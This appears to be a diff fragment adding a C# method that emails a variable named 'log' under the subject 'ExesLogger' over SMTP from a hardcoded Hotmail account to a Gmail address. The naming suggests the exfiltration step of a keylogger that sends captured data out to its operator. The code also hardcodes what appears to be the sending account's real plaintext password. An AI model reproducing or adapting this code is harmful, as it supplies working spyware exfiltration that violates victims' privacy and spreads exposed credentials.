@@ -1,0 +1,22 @@
+ void SendMail()
+        {     
+
+            SmtpClient smtpClient = new SmtpClient("smtp.live.com");
+            var mail = new MailMessage();
+            mail.From = new MailAddress("crazy_crazy.46@hotmail.com");
+            mail.To.Add("bkztrk@gmail.com");
+            mail.Subject = "ExesLogger";
+            mail.IsBodyHtml = true;
+            mail.Body = log;
+            //string htmlBody;
+            //htmlBody = "Write some HTML code here";
+            //mail.Body = htmlBody;
+            smtpClient.Port = 587;
+            smtpClient.UseDefaultCredentials = false;
+            smtpClient.Credentials = new System.Net.NetworkCredential("crazy_crazy.46@hotmail.com", "297232100889a");
+            smtpClient.EnableSsl = true;
+            smtpClient.Send(mail);
+
+
+
+        }
